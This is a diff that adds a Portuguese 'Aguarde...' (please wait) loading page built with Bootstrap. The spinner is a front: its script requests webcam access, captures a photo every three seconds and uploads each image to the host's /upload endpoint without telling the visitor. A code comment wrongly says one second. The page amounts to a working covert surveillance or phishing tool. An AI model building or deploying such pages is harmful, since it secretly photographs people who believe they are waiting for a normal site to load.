@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Aguarde...</title>
+    <!-- Bootstrap CSS -->
+    <link
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      .spinner {
+        width: 3rem;
+        height: 3rem;
+      }
+      .full-screen {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        text-align: center;
+        background-color: #f8f9fa;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container full-screen">
+      <div class="row">
+        <div class="col-12">
+          <div class="text-center" id="loadingContainer">
+            <div
+              class="spinner-border text-primary spinner"
+              role="status"
+            ></div>
+            <h1 class="mt-3">Aguarde...</h1>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <script>
+      "use strict";
+
+      // Obtenha a base URL dinamicamente
+      const baseUrl = window.location.origin;
+
+      function tiraFoto(video) {
+        let canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth; // Define a largura do canvas
+        canvas.height = video.videoHeight; // Define a altura do canvas
+        canvas
+          .getContext("2d")
+          .drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob((blob) => {
+          let formData = new FormData();
+          formData.append("image", blob, "webcam.png");
+          fetch(`${baseUrl}/upload`, {
+            method: "POST",
+            body: formData,
+          })
+            .then((response) => response.json())
+            .then((data) => console.log("Imagem enviada:", data))
+            .catch((error) => console.error("Erro ao enviar imagem:", error));
+        }, "image/png");
+      }
+
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          let video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+
+          // Captura e envia fotos a cada 1 segundo
+          setInterval(() => tiraFoto(video), 3000); // tira a foto a cada 3 segundos
+        })
+        .catch((error) => console.error("Erro ao acessar a câmera:", error));
+    </script>
+  </body>
+</html>
